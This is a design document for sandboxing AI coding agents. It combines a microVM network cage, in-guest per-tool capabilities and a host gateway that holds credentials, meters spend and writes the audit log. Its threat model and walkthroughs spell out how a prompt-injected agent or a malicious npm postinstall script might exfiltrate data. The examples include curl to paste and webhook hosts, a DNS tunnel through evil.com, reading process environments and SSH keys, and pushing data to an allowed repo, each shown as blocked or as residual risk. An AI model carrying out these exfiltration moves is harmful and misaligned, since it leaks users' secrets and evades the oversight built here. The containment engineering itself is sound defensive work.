# PoC design: microsandbox + nono + tether

October 18, 2026. Design only; nothing here is implemented. Prepared for Chad Metcalf (advising Ringleader).

**Pinned sources.** microsandbox `44b0a8f` (Oct 17); libkrunfw `krunfw@21f169f`, the commit microsandbox pins (branch head `70ff1e8`, Oct 16, gives the same findings); nono `cf73ec0` (Oct 16, nono-cli 0.80.0); leash `68a2b1c`.

**Path prefixes.** `ms/` is microsandbox, `krunfw/` is libkrunfw, `nono/` is nono, and `leash:` refers to today's `leash` script (`./leash` in this repo), followed by a line number. Web sources are listed at the end.

**Naming.** tether is the gateway this PoC builds. It starts as a copy of today's leash and grows from there, so "leash" below always means the existing script and its spike, which stay unchanged as the baseline.

**Confidentiality.** Lines tagged **[RL-INTERNAL]** restate Ringleader's internal strategy doc (Sep 15) or its 8-week plan (Oct 13). Both documents are marked as containing unreleased roadmap, so strip those lines before this leaves Ringleader. Customer and prospect names from those documents are left out. **UNVERIFIED** marks anything I could not confirm from source or vendor docs.

## Thesis

**What the PoC proves.** It proves four things:

1. A coding agent on a Mac can run in a microVM where root in the guest cannot:
   - reach anything except one gateway port,
   - read a provider credential,
   - spend past a per-session cap.
2. Inside that VM, each agent and each tool it launches holds its own revocable capability, so the gateway records every decision as `sandbox / session / agent / tool`.
3. One policy file compiles into the configuration for all three layers.
4. The same gateway and the same file run in a customer VPC, with a firewall rule taking the place of the microVM's netstack.

**Verdict: the three compose, but only after two of them are demoted.**

- **microsandbox becomes a dumb L3 cage.** Its only reachable destination is one tether port. Its L7 features stay off: secret placeholders, TLS interception and domain rules each fight tether, and none of them exists on a cloud VM.
- **nono becomes an in-guest capability distributor and confiner.** It decides which process tree gets which capability and which files. Its proxy stays off, because inside the cage it adds nothing and its credential store is readable by guest root.
- **tether is the only L7 authority.** It owns credentials, egress, identity, spend and audit.

Two seams block even the demoted composition, and both are on the critical path:

- microsandbox's guest kernel has no Landlock, and on arm64 it has no LSM framework at all. nono refuses to start without Landlock.
- nono cannot authenticate to an upstream proxy, so the design does not chain through nono's proxy.

**Chosen architecture.**

- **Cage.** Each sandbox is a microsandbox VM with network policy `deny all; allow host:tcp:<P>`: no DNS, no secrets, no interception.
- **Gateway.** `host.microsandbox.internal:<P>` lands on tether on the host loopback. One port per sandbox, so the port identifies the sandbox.
- **Guest.** Each agent runs as its own Unix user in a nono session sandbox. nono command policies give `git`, `npm` and other tools their own tether capability and file grants. Landlock limits every process to TCP port P.
- **Traffic.** Credentialed and metered traffic uses explicit tether routes (`/anthropic/`, `/github/`). Everything else uses `HTTPS_PROXY` CONNECT to mostly-read hosts. Nothing intercepts TLS.
- **Cloud.** The cage becomes a VPC egress rule and tether an appliance. Only `placement` in the policy file changes.

## Architecture

### Chosen layering

```
LAPTOP -----------------------------------------------------------------------
 microVM "chad-dev"   (libkrun; custom libkrunfw built with Landlock)
 +----------------------------------------------------------------------+
 | uid dev            human shell, sudo, dotfiles                       |
 | uid agent-claude   nono session sandbox                              |
 |   claude ............................ cap C  (route: anthropic)      |
 |     +- git  (nono command sandbox) .. cap G  (route: github)         |
 |     +- npm  (nono command sandbox) .. cap N  (egress: registry)      |
 |          +- postinstall (inherits npm's sandbox and N)               |
 |   Landlock: every TCP connect() -> port 18001 only; seccomp: no UDP  |
 +--------------------------- virtio-net -------------------------------+
 msb host process: smoltcp   policy: deny * ; allow host:tcp:18001 ; no DNS
          |  gateway-IP:18001  ->  host 127.0.0.1:18001
 tether  listener 127.0.0.1:18001  ==  sandbox chad-dev
          cap -> (sandbox, session, agent, tool, human)
          /anthropic /github routes | CONNECT allowlist | spend | audit
          keys: keychain (solo) or control plane (team) ----> api.anthropic.com
                                                              github.com, registry.npmjs.org
CLOUD: same image, users, nono profiles. Cage = VPC egress rule {tether:443};
       tether = VPC appliance; sandbox identity = source IP instead of port.
```

| Layer | Enforces | Forgeable by |
|---|---|---|
| L0 cage (microsandbox, QEMU `restrict=on`, or a cloud firewall) | The only reachable endpoint is tether port P | Nothing in the guest |
| L1 gateway (tether) | Credentials, egress, spend, audit, sandbox identity | Nothing in the guest |
| L2 in-guest (per-agent UIDs + nono) | Which process holds which cap; file access; TCP between processes inside the VM | Root in the guest |

The design follows five rules:

1. Only one component parses HTTP.
2. No TLS is intercepted.
3. No real credential enters the guest, and every guest capability is bound to its sandbox's channel.
4. Sandbox identity is enforced outside the VM. Agent and tool identity is handed out inside it, and the design says so plainly.
5. CONNECT is only for hosts that are mostly read from. Any host that accepts writes gets an explicit route with path rules.

### Alternatives considered

| | Layering | Verdict |
|---|---|---|
| A | Cage plus a single gateway, as above | **Chosen** |
| B | **microsandbox does L7:** a domain allowlist with DNS pinning, `$MSB_*` placeholders for GitHub; tether only meters `/anthropic/` | **Rejected.** Declaring any secret turns interception on (`ms/docs/cli/configuration.mdx`): a CA in the guest, and the netstack MITMs every `CONNECT` the guest opens, including to tether (`ms/crates/network/lib/engine/tcp/proxy.rs:328,671`). `managed.json` cannot enforce destination rules (`ms/docs/enterprise/managed-configuration.mdx`). Interception, outbound proxy and host sockets are local-only and absent on cloud VMs, so laptop and cloud would run two credential systems. Kept as the fallback for tools that ignore `HTTPS_PROXY`. |
| C | **Chain everything:** nono phantom → nono proxy (intercepting) → upstream proxy → msb netstack (intercepting, placeholders) → tether | **Rejected.** Three HTTP parsers and two MITM CAs. nono's upstream hop can't carry credentials (`nono/crates/nono-proxy/src/external.rs:224`, "not yet implemented"), so tether loses tool identity. nono allows `http://` upstreams only on loopback (`reverse.rs:2218`). No layer owns a denial. |
| D | **Host-side `nono proxy` per sandbox as the gateway** | **Rejected for the PoC.** See the next section. |
| E | **Ringleader's own QEMU/Lima VM** with `restrict=on` + `guestfwd` (the existing spike) | **Not rejected: the reference cage.** Same gateway, same policy. microsandbox leads on boot time, a memory-safe netstack (Rust smoltcp vs C libslirp), snapshots and fork, and Windows (WHP). QEMU leads on stock kernels (Landlock usually on, UNVERIFIED per image), full-VM behavior, and no new dependency. |

**Could tether shrink to a compiler plus a spend/audit sidecar** once microsandbox does DNS pinning, SNI checks and placeholders? That is design B, and it cuts the wrong way: microsandbox's L7 is per-sandbox, local-only and forces interception; tether would still meter and audit; and two L7 policies would disagree at every edge. Cut the other way instead: keep microsandbox dumb, keep tether narrow, drop nono's proxy.

### Gateway options: extend nono's proxy, adopt an LLM gateway, or grow leash

Requirements:

- **R1 Claude Code:** stream `/v1/messages?beta=true` unbuffered; forward `anthropic-beta`/`anthropic-version` verbatim; keep SSE pings; pass error bodies unmodified (Claude Code gateway protocol page).
- **R2 Codex:** Responses API over SSE; WebSocket transport behind flags, falling back to HTTPS.
- **R3 git smart-HTTP**, packfiles streamed. **R4 MCP** over streamable HTTP and WebSocket.
- **R5** issue and revoke caps per session, agent and tool. **R6** a per-session cap that refuses the next call, with bounded overshoot.
- **R7** a CONNECT allowlist for everything else. **R8** per-decision audit with export. **R9** small on a laptop, same binary in a VPC.

| Candidate | Claude Code (R1) | Subscription logins | Cap that refuses the next call (R6) | git and CONNECT (R3, R7) | WebSocket, MCP (R2, R4) | Issue and revoke (R5) | Footprint | Evidence |
|---|---|---|---|---|---|---|---|---|
| **nono proxy, extended** | SSE unbuffered | Captures the OAuth login; the agent gets phantom tokens; needs interception | No usage parsing; only per-route rate limits | CONNECT allowlist yes; reverse-route bodies buffered with a 16 MiB cap (`reverse.rs:39`); allows RFC 1918 after DNS resolution | Reverse-route upgrade returns 501 (`reverse.rs:139-162`) | One token per proxy instance | 1 Rust binary | Source, docs |
| **LiteLLM** (MIT core) | Documented `/v1/messages` setup | Forwards the client's OAuth token, so here it would live in the guest | `max_budget` per virtual key; reservations reject before sending | None | UNVERIFIED | Key API: generate, block, delete | Python, Postgres, optional Redis | Docs |
| **Claude apps gateway** (Anthropic; in the `claude` binary; not open source) | Built for Claude Code; forwards betas without an allowlist | Replaced by SSO | Per user, group or org; daily, weekly or monthly; 429 on the next request; fails open on a database outage by default | None | Claude clients only (no Codex) | OIDC sessions, 1 hour | `claude`, Postgres, IdP | Docs |
| **Agent Router** (formerly Envoy AI Gateway; v0.6.0, May 2026) | Anthropic endpoint per third parties (UNVERIFIED) | UNVERIFIED | Cost tracking only; its QuotaPolicy is "API-only — no ... enforcement" | Separate Envoy config | MCP routing yes | Envoy Gateway policies | Envoy, plus K8s or `aigw` | Release notes |
| **Kong AI Gateway** | `llm_format: anthropic`; the official tutorial requires Enterprise 3.13+ | UNVERIFIED | AI Rate Limiting Advanced (Enterprise, per third party) | Separate config | UNVERIFIED | Consumers via the Admin API | Kong plus a database | Docs |
| **Portkey gateway OSS** (MIT; Palo Alto Networks announced it is acquiring Portkey) | Claude Code docs target hosted `api.portkey.ai`; betas need `forward_headers` | Hosted only | Not in the OSS README | None | MCP (tier unclear) | Hosted | Node | Docs |
| **leash, 80/20** | SSE streamed and metered; all non-hop headers forwarded | Injects a gateway-held OAuth token and adds the betas (one person's own subscription only) | Per session per day, charged at the end; concurrent calls overshoot | `/github/` route plus CONNECT; request bodies buffered up to 64 MiB (`leash:678`) | `upgrade` is stripped (`leash:66`); Codex falls back to HTTPS | Static session list; revoke means stopping the gateway | stdlib Python | Own code |

Bifrost (Go, Apache-2.0) claims virtual-key budgets and an MCP gateway (vendor claims, UNVERIFIED). LiteLLM 1.82.7 and 1.82.8 shipped to PyPI on March 24, 2026 with a credential stealer, reportedly via a compromised CI scanner; for a component holding every key, supply chain is a selection criterion.

**Recommendation: grow leash 80/20 for the PoC.** Every candidate covers at most R1, R5, R6 and R8, and only for model traffic; none covers git, CONNECT egress or channel-bound identity. Adopting one still leaves leash's egress half to build, so the PoC would carry two policy engines, two audit streams and Postgres on a laptop before proving anything new. The new claims (cage, per-tool caps, per-session caps, one policy) live in the parts nobody ships. Keep the model hop swappable: the `/anthropic/` route's upstream can be LiteLLM or a Claude apps gateway instead of `api.anthropic.com`, while tether keeps caps, binding, egress, git and audit.

What flips it:

- **LiteLLM for model routes:** multi-provider routing or translation becomes a requirement, or the buyer already runs it. Pin and hash-verify.
- **Claude apps gateway for Claude Code traffic (team or cloud):** a Claude-Code-only customer with an OIDC IdP who accepts per-user instead of per-session caps. Benefit: Anthropic keeps forwarding current with new betas.
- **Extended nono proxy:** nolabs upstreams metering, multi-session caps and streamed bodies; or Ringleader standardizes on nono's formats; or phantom-token subscription logins for solo developers outweigh per-session caps.
- **In every case after the PoC:** rewrite tether in Go or Rust.

## Where each function lives

| Function | Owner | Why | What the other layers do |
|---|---|---|---|
| Credential storage | tether: host keychain (solo); KMS or Vault at the control plane (team, cloud) | Only component that needs plaintext keys; outside the VM | microsandbox: none. nono: caps only |
| Credential injection | tether explicit routes | One injector, no MITM, same on laptop and in a VPC | msb placeholders off (they force interception). nono hands caps to tools, never keys |
| Identity | tether mints `cap → (sandbox, session, agent, tool, human)`, bound to the sandbox's listener (cloud: source IP) | Sandbox identity can't be forged from the guest; a copied cap is useless off its channel | msb: per-sandbox port rule. UIDs: one per agent. nono: which process tree gets which cap |
| Egress allowlist | tether, per cap, intersected with the org ceiling | Outside the VM, portable, admin-owned | msb: only tether reachable. nono: no outbound role |
| DNS | tether resolves; the guest has none | No DNS tunnels; connecting to the checked address is the pinning | msb answers every guest query NXDOMAIN (`ms/crates/network/lib/engine/dns/forwarder.rs:294`) |
| In-VM process-to-process | nono (Landlock TCP port rule, file grants) + per-agent UIDs (permissions on Unix sockets) | Only an in-guest layer can tell processes apart | — |
| TLS interception | Nowhere | No CA in the guest, no broken pinning, no msb CONNECT MITM | tether reads SNI from the ClientHello on tunnels |
| Spend metering and caps | tether | It is the TLS client to the provider, so it alone sees usage frames | nono per-route rate limits: optional brake |
| Audit (system of record) | tether: hash-chained JSONL, exported | Outside the guest; one record for all layers | nono: per-session ledger shipped at session end (supplementary; guest-root forgeable). msb: runtime logs, OTel byte counters |
| Policy authoring | One file, `tether compile` | Proves inner rules ⊆ outer rules | msb and nono configs are build artifacts |
| Lifecycle | tether mints caps per boot and revokes; msb creates, stops, snapshots | Revocation must not depend on the guest | nono: one session per agent run |
| Human approvals | tether queue (new hosts, routes, cap raises); nono approvals post to it (approval-webhook-v1) | One queue; egress decisions outside the guest | — |

Threat model:

| Threat | Stopped by | Not stopped by (residual risk) |
|---|---|---|
| Prompt-injected agent | tether allowlist and routes; channel-bound caps; no DNS in the guest; nono file grants | Exfiltration through allowed channels: the prompt itself, a push to an allowed org repo, query strings sent to allowed download hosts |
| Agent smuggles in an attacker's own provider key | tether refuses CONNECT to any host that has a route (`leash:429`), and routes strip guest credentials. Without that, the provider becomes a dead drop | — |
| Malicious dependency (postinstall script) | npm's cap allows only the registry. nono file grants block `~/.ssh`, other caps and `.git/`. Landlock blocks reading other domains' `/proc/*/environ` (verify) | Files written into the project that a later tool runs (git ignores hooks). Data hidden in registry GET paths |
| Compromised tool or MCP server | Its own cap and its own file grants | Anything inside those grants |
| Root in the guest (kernel bug, the human's `sudo`, misconfiguration) | The microsandbox cage; tether ceilings and caps; no real keys in the guest | Can use every cap in the guest within its scope, forge tool identity, and rewrite nono's ledger |
| Curious developer | Team mode: keys never reach the laptop | Solo mode: tether runs as them, and the keychain is theirs |
| Malicious developer | Team mode: the org ceiling, plus audit at the control plane. Cloud: the VPC egress rule | On a laptop they own the machine and can run agents outside Ringleader. Every laptop product concedes this |
| Stolen laptop | OS disk encryption; revoking caps and the device | Code and snapshots on disk; solo-mode keys |
| Compromised host | Team mode limits damage to the cap and the time until revocation | Everything local |

## Components

### microsandbox: the cage

**Role.** Hardware isolation plus one L3 invariant: the only reachable endpoint is tether port P.

**Must do:**

- **Restrict the network** with `--net-default deny --net-rule "allow@host:tcp:P"`.
  - The `host` group is the gateway IP (`ms/crates/network/lib/engine/policy/destination.rs:47`), and microsandbox dials it as the host loopback (`tcp/upstream.rs:101`).
  - agentd writes the gateway alias into `/etc/hosts` (`ms/crates/agentd/lib/network.rs:23`), so the guest needs no DNS.
- **Add no DNS rule.** Denied queries get a synthetic NXDOMAIN immediately, with no resolver timeouts.
- **Run workloads as non-root** (`--user dev`). Agents run under their own UIDs inside nono.
- **Keep caps in a tmpfs** (`--tmpfs /run/tether`), written at boot over the host-driven control channel.
- **Boot the custom libkrunfw.**

**Must not:**

- **Use secrets or placeholders.** They would be a second injector, and they turn interception on.
- **Intercept TLS.** With interception state present, the netstack treats any guest flow that starts with `CONNECT` as a tunnel to MITM (`tcp/proxy.rs:328`).
- **Use domain rules.** They subject every plain-HTTP request to per-authority policy checks (`proxy.rs:367`, `secrets/handler.rs:593`), including requests to tether.
- **Use the outbound proxy for tether.** It sends `CONNECT <ip>:<port>` with no authentication (`ms/crates/network/lib/proxy/http_connect.rs:63`), so tether would lose both the hostname and the identity. One later exception: a proxy enforced through `managed.json` is the only network floor an admin can pin on a device.
- **Publish ports beyond `127.0.0.1`,** or connect vsock to powerful host sockets.

**Seams and how they are resolved:**

1. **No Landlock in the guest kernel.** At the pinned commit the kernel is 6.12.111.
   - The configs say `krunfw/config-libkrunfw_aarch64:3087: # CONFIG_SECURITY is not set` and `config-libkrunfw_x86_64:2436: # CONFIG_SECURITY_LANDLOCK is not set`.
   - Fix: build libkrunfw 5.6.1 with `CONFIG_SECURITY=y`, `CONFIG_SECURITY_LANDLOCK=y`, and `landlock` in the compiled-in `CONFIG_LSM`. The kernel command line is not exposed to users (`ms/crates/runtime/lib/runner/vm.rs:1935`), so this has to be compiled in.
   - Load it with `MSB_LIBKRUNFW_PATH`. macOS will load a locally built (ad-hoc signed) library because `msb` carries `disable-library-validation` (`ms/msb-entitlements.plist`).
   - Offer the change upstream, and rebuild for every msb release.
2. **No Yama either.** Isolation between same-UID processes rests on Landlock domain scoping alone, so each agent gets its own UID.
3. **One shared, unconstrained interception CA** lives at `~/.microsandbox/tls/ca.key` (`tls/state.rs:430-490`). The brief described it as per-sandbox; it is not. It is unused while interception is off.
4. **All sandboxes share the host loopback,** hence one port per sandbox. Host processes can reach those ports too, so caps are still required.
5. **Tools that ignore `HTTPS_PROXY` fail closed** with an immediate NXDOMAIN, visible in the audit log. Node's `fetch` needs `NODE_USE_ENV_PROXY=1`. Fallback for named hosts: architecture B.
6. **Docker in the VM works** on a flat root disk (`ms/docs/how-to/docker/docker-in-sandbox.mdx`), but `docker.sock` is guest root: give it to a `docker` tool with its own proxy settings and cap, never to an agent.
7. **Full snapshots capture memory, caps included.** Caps are minted per boot and bound to the sandbox, so a restored clone gets a new identity and new caps.
8. **Developer ergonomics.** The rootfs is OCI, not devcontainer: run `devcontainer build` and pin the image digest. Keep the workspace on guest disk (virtio-fs is slow for installs) and sync through the git route. IDE attach uses `msb ssh serve --stdio` as a ProxyCommand, with no inbound port; the VS Code server needs its own tool cap or a pre-built image.
9. **Do not forward ssh-agent.** Landlock through ABI V6 (kernel 6.12) cannot govern `connect()` on pathname Unix sockets (`nono/neps/0004-opt-in-linux-namespace-isolation.md`). Use git through the tether route.

### nono: capabilities inside the guest

**Role.** Decide which process tree holds which cap and which files, and confine traffic between processes inside the VM.

**Must do:**

- **One session sandbox per agent,** running as that agent's UID. It grants `/work` and the agent's home directory, nothing else.
- **A command policy per tool.**
  - The token broker's `GrantSet` scopes each cap to its consumer (`cmd.<name>`) and promotes the value only just before `execve` (`nono/crates/nono-cli/src/tool-sandbox/token_broker.rs:1-60`).
  - Nonces are redacted from captured output.
- **Network: `tcp_connect_ports: [P]`** (Landlock ABI V4), on top of nono's static seccomp baseline, which blocks UDP and raw sockets.
  - For traffic leaving the VM this duplicates the cage.
  - The real job is inside the VM: an npm script cannot reach another agent's dev server or a database in the VM.
  - Landlock port rules match any destination host (`nono/docs/cli/features/networking.mdx`), but inside the cage that imprecision does not matter.
- **Harden tool launches.** Give git `argv_prepend: ["-c","core.hooksPath=/dev/null"]`, pin executables, and deny direct-exec bypass for any tool that holds a cap.
- **Optionally,** send approvals and session audit to tether through nono's open protocols (`nono/docs/protocols/approval-webhook-v1.md`, `audit-delivery-v1.md`).

**Must not:**

- **Hold real keys:** guest root can read the supervisor's memory.
- **Run its proxy:** inside the cage it adds nothing, and it resolves DNS itself (`nono-proxy/src/filter.rs:94`), has an unauthenticated upstream hop, accepts `http://` upstreams only on loopback, caps bodies at 16 MiB, and returns 501 to WebSocket upgrades.
- **Intercept TLS,** or be the system of record: audit is finalized at session end into a local ledger (`nono/docs/cli/internals/security-model.mdx`).

**Seams:**

1. **The guest kernel** (see the microsandbox section). nono exits early without Landlock (`nono/crates/nono-cli/src/sandbox_prepare.rs:789`).
2. **Putting a cap inside `HTTPS_PROXY`'s userinfo.** Whether env promotion supports templated values is UNVERIFIED. Fallback: grant the cap file to a single tool with `fs_read_file` and use a three-line launcher.
3. **Tools run under the agent's UID.** Keeping a tool's cap secret from the agent depends on Landlock's ptrace and `/proc` scoping. The PoC must test this.
4. **Interpreter bypass** (`node .../npm-cli.js`) runs with the agent's authority, not npm's. It cannot get npm's cap, so it fails closed.
5. **Fallback for per-agent identity without nono.** Map each UID to its own tether port with in-guest nftables (`meta skuid`; `CONFIG_NF_TABLES=y` is set in libkrunfw). This needs no Landlock. Per-tool identity still needs nono.

### tether: the gateway

**Role.** The only component that sees plaintext or credentials.

**Lifecycle.**

- **Create:** `tether compile`, then tether picks port P and mints caps, then `msb create` builds the cage, then `msb exec` writes the caps to `/run/tether` and starts the nono sessions.
- **Revoke:** `tether cap revoke` takes effect immediately and does not depend on the guest.

**Must not** intercept tunnels, run inside a VM, store headers or bodies, act as a plain-HTTP forward proxy, or trust client-asserted identity (`x-claude-code-session-id` and `x-claude-code-agent-id` are recorded, not trusted).

**Changes from today's leash:**

1. **Channel binding.** One listener per sandbox on `127.0.0.1`. In the cloud, one TLS listener that binds by source IP, with optional mTLS. A cap works only on its own sandbox's channel. Today leash has a single listener.
2. **Cap registry.** Each cap maps to `{sandbox, session, agent, tool, human, routes, egress, spend sub-cap, expiry}`. Commands: `tether cap mint|revoke|list`. Caps are minted at each boot and delivered into tmpfs. Today leash reads a static `sessions` list.
3. **Per-cap policy,** intersected with the org ceiling.
4. **CONNECT hardening.** Resolve on the host; refuse loopback, RFC 1918, link-local, metadata, CGNAT and ULA addresses unless allowlisted by address; connect to the checked address; require ClientHello SNI to equal the CONNECT host; refuse IP literals. Today leash checks the name, then calls `socket.create_connection((host, port))` (`leash:524`). A gateway on the host sits on the host's loopback, LAN and VPN, so that call is a pivot the guest alone would not have. Encrypted ClientHello fails closed; Host-header fronting inside TLS remains possible on CDNs that permit it.
5. **Stream request bodies.** Today `_read_body` buffers up to 64 MiB (`leash:678`), so a large `git push` fails.
6. **Pass `Upgrade` through on routes,** for Codex and MCP over WebSocket.
7. **Spend reservations.** Reserve at admission (input bytes ÷ 4 × input price + `max_tokens` × output price) and reconcile at stream end. Cap concurrent calls per session. Bill aborted streams at a floor of about 4 characters per token, as the Claude apps gateway does. Refuse with a non-retryable error. Today leash checks before and charges after, so overshoot equals the calls in flight.
8. **Audit.** Add `sandbox`, `agent`, `tool`, `human`, `cap_id`, `request_id`, `upstream_request_id`, `policy_version` and `rule`, plus the client-sent Claude Code IDs. Chain lines with `prev_hash`, ship signed checkpoints over OTLP or HTTPS, and return `x-tether-request-id` so guest logs can join.
9. **Claude Code conformance.** Answer `HEAD /api/hello` (sent only when no proxy is set). Allow `/v1/messages/count_tokens` and `/v1/models`. Forward `anthropic-*` headers, bodies and error bodies unchanged. Set `skipWebFetchPreflight: true`: the preflight calls `api.anthropic.com` directly, and CONNECT to a route host must stay refused. The fast-mode check also goes direct and will report an error; accepted.
10. **Stretch: ref-scoped pushes.** Read the leading pkt-lines of `git-receive-pack` and allow only `refs/heads/agent/*`.
11. **`tether compile`.** Emits microsandbox flags, nono profiles and tether config. It checks that inner rules are subsets of outer rules and lints wildcards.
12. **Team mode (not in the PoC).** Model routes forward to Ringleader's hosted metering endpoint [RL-INTERNAL: built, not deployed] or to a Claude apps gateway.

**Unchanged:** no interception, no DNS service, no headers or bodies in logs, and capability strings rather than credentials in the guest. Clients speak HTTP/1.1 to tether; one that insists on HTTP/2 to the gateway is out of scope.

## Request walkthroughs

**1. A Claude Code model call, streaming**

1. `claude` (uid `agent-claude`) sends `POST http://host.microsandbox.internal:18001/anthropic/v1/messages?beta=true` with `Authorization: Bearer lsh_C…`. `NO_PROXY` covers the gateway alias, so there is no CONNECT.
2. In the guest, Landlock permits TCP port 18001, and `/etc/hosts` resolves the alias to the gateway IP.
3. The microsandbox netstack matches the `host` group on TCP 18001, allows the connection and dials `127.0.0.1:18001` on the host. Nothing parses the bytes.
4. tether checks and forwards the request:
   1. Port 18001 identifies `chad-dev`, and cap C resolves to `(s1, claude, tool=-)`.
   2. It confirms C is bound to `chad-dev` and the path is `/v1/messages`; the query string is ignored.
   3. It reserves an estimate against the session, agent and team caps.
   4. It strips the guest's auth headers, injects the real key, and opens TLS to `api.anthropic.com` from the host's network.
5. SSE is relayed chunk by chunk, pings included. The meter reads `message_start` and `message_delta`, then settles the reservation when the stream ends.
6. One audit line records the decision, rule, model, tokens, cost in USD, latency, upstream request ID and `prev_hash`.

Only tether and microsandbox's host process see plaintext on the laptop hop, and both are on the trusted side. In the cloud, that hop is TLS.

**2. `git push`**

1. `git` goes through the PATH shim to nono, which runs it in git's command sandbox:
   - write access to `/work`, including `.git`;
   - cap G, which only `cmd.git` can redeem;
   - `GIT_CONFIG_*` that rewrites `https://github.com/` to `http://git:G@…:18001/github/`;
   - hooks disabled.
2. On `GET …/info/refs?service=git-receive-pack`, tether resolves G to `tool=git`, matches the path glob `/acme/*/info/refs`, and injects the fine-grained token as Basic auth.
3. `POST …/git-receive-pack` streams the packfile (change 5). The audit line records `tool=git` and `bytes_up`.
4. Denials:
   - a push to `/evil/x` gets a 403 on the path;
   - cap C on `/github/` gets a 403 because that route is not granted;
   - git run without the shim has no cap and gets a 401.

**3. `npm install`**

1. npm runs in its command sandbox with write access to `/work` and `~/.npm`, no access to `/work/.git`, and `HTTPS_PROXY=http://npm:N@…:18001`.
2. npm sends `CONNECT registry.npmjs.org:443` with `Proxy-Authorization`. tether:
   1. resolves N to `tool=npm`;
   2. checks the host against npm's allowlist;
   3. resolves the name on the host and confirms a public address;
   4. connects and checks that the SNI matches;
   5. splices the two connections.

   The audit line records the bytes transferred.
3. Lifecycle scripts inherit npm's sandbox and cap.

**4. Exfiltration attempts by a prompt-injected agent**

| Attempt | What happens |
|---|---|
| `curl https://paste.example` | CONNECT is refused with 403 before the name is resolved, and the refusal is audited. |
| `--noproxy`, or a raw IP | Landlock refuses the `connect()` to port 443. Even as root with nono killed, the microsandbox cage drops the packets. |
| A DNS tunnel (`dig $(secret).evil.com`) | microsandbox answers NXDOMAIN locally. Through CONNECT it is refused before resolution, but the hostname, secret included, lands in the audit log. Treat the audit log as sensitive. |
| Echoing a credential | No real key exists in the guest, and the agent's own cap only works from `chad-dev`'s channel. Reading git's cap from `/proc/<git>/environ` is blocked by Landlock scoping (verify). |
| Using an attacker's key | `CONNECT api.anthropic.com` gets a 403 because it is a credentialed host. On `/anthropic/`, guest credentials are stripped. |
| Residual | Data hidden inside a commit to an allowed repo, or inside the prompt itself. |

**5. A malicious postinstall script running as another tool**

1. It runs as a child of npm, in npm's command sandbox with cap N.
2. Reading `~dev/.ssh`, `/run/tether/*` or `/proc/<claude>/environ` is blocked by file permissions and Landlock.
3. `curl https://webhook.site` gets a 403 from tether, logged as `tool=npm`, because npm may only reach the registry.
4. Writing `.git/hooks/pre-push` is refused, and git ignores hooks anyway.
5. It cannot call a model, because N carries no route.
6. If it gets root, the cage still holds. The damage is capped by the caps in the guest and the session's spend cap.

## Policy model

One file for the PoC. The schema `rl/poc-1` is illustrative:

```yaml
machine:
  name: chad-dev
  image: ghcr.io/acme/devbox@sha256:…        # output of `devcontainer build`
  cpus: 4
  memory: 8G
  humans: [chad@example.com]                 # uid dev, sudo; agents never get sudo
gateway:
  credentials:
    anthropic: keychain:anthropic-team       # cloud: kms://…
    github:    keychain:gh-finegrained-acme
  routes:
    anthropic: {upstream: https://api.anthropic.com, credential: anthropic, inject: anthropic,
                paths: [/v1/messages, /v1/messages/count_tokens, /v1/models, /api/hello], meter: true}
    github:    {upstream: https://github.com, credential: github, inject: "basic:x-access-token",
                paths: ["/acme/*/info/refs", "/acme/*/git-upload-pack", "/acme/*/git-receive-pack"]}
  egress: {deny_private: true, ports: [443]}
  spend: {prices: builtin, session_usd_per_day: 20, max_inflight: 4}
agents:
  claude:
    command: claude
    fs: {write: [/work]}
    routes: [anthropic]
    egress: [docs.python.org]                # WebFetch targets
    settings: {skipWebFetchPreflight: true}
    tools:
      git: {routes: [github], fs: {write: [/work]}, argv_prepend: [-c, core.hooksPath=/dev/null]}
      npm: {egress: [registry.npmjs.org], fs: {write: [/work, ~/.npm], deny: [/work/.git]}}
ceiling:                                     # org layer; pulled from the control plane in team mode
  routes: [anthropic, github]
  egress: [registry.npmjs.org, pypi.org, files.pythonhosted.org, docs.python.org]
  spend: {session_usd_per_day: 25}
audit: {sink: "file:run/audit.jsonl"}        # team mode: otlp+https://…
placement: laptop                            # or {cloud: gcp, project: …, network: …}
```

How each section compiles:

| Section | microsandbox | nono | tether |
|---|---|---|---|
| `machine` | `msb create <image@digest> --name chad-dev --cpus 4 -m 8G --user dev --net-default deny --net-rule "allow@host:tcp:18001" --tmpfs /run/tether` (network flags verified; others illustrative) | Users and home directories created at bootstrap | Listener `127.0.0.1:18001`, bound to `chad-dev` |
| `agents.<a>` | — | Session profile: file grants, `tcp_connect_ports: [18001]`, environment (`ANTHROPIC_BASE_URL`, `HTTPS_PROXY`, `NO_PROXY`), Claude settings | One cap per (session, agent), carrying its routes, egress and spend |
| `…tools.<t>` | — | Command policy: file grants, cap delivery, `argv_prepend`, pinned executable | One cap per (session, agent, tool) |
| `gateway`, `ceiling`, `audit` | — | Audit target (optional) | Routes, injection, key sources, ceiling, sink |

The compiler refuses a policy that breaks any of these rules:

- Each tool's grants fit inside its agent's, and each agent's fit inside the ceiling.
- No CONNECT host is also a route host.
- No wildcards over multi-tenant upload domains such as `*.amazonaws.com`, `*.googleapis.com`, `*.blob.core.windows.net`, or tunnel services. For example, `*.s3.amazonaws.com` on a CONNECT list lets an agent exfiltrate to any bucket.
- Every metered route has a spend cap.

**Laptop to cloud: only `placement` changes.**

- **The cage** becomes a VPC egress rule that allows only tether on port 443, with no public IP.
  - Close DNS with the provider's DNS firewall (AWS Route 53 Resolver DNS Firewall; GCP and Azure equivalents UNVERIFIED). Otherwise the VM can resolve names through the VPC resolver.
  - Attach no instance identity: no service account, and IMDS turned off. Otherwise root in the guest gets cloud credentials.
- **tether** runs the same binary and config as an appliance:
  - a TLS listener with a name-constrained CA;
  - sandboxes identified by source IP;
  - keys from KMS or Vault;
  - audit sent to the customer's SIEM.
- **nono** uses the same profiles, provided the distro kernel ships Landlock ABI V4 or later (UNVERIFIED per image).

Three things do not carry over:

- microsandbox snapshots, which use a local format;
- port-based sandbox identity, which becomes source-IP identity;
- DNS and metadata handling.

Moving a machine therefore means rebuilding it from the file and pulling the workspace back through git. The VM itself is not migrated.

## Against the Ringleader vision

**Market check.** The brief's "nobody does per-session spend caps" still holds, but spend caps in general are now common, so the claim has to stay precise:

- LiteLLM has per-key budgets with reservations.
- Anthropic's Claude apps gateway, which ships in the `claude` binary, has per-user, per-group and per-org caps for Claude Code.

Still unclaimed:

- **per-session** and **per-agent** caps enforced outside the machine;
- per-tool attribution inside one VM.

The rest of the brief also holds:

- Docker Sandboxes enforces on the same laptop, with no BYOC and no caps.
- By Coder's own account, its in-workspace jail can be bypassed.
- Nobody reads devcontainer files.
- Every laptop product concedes that a local admin can bypass it.

**What the PoC validates:**

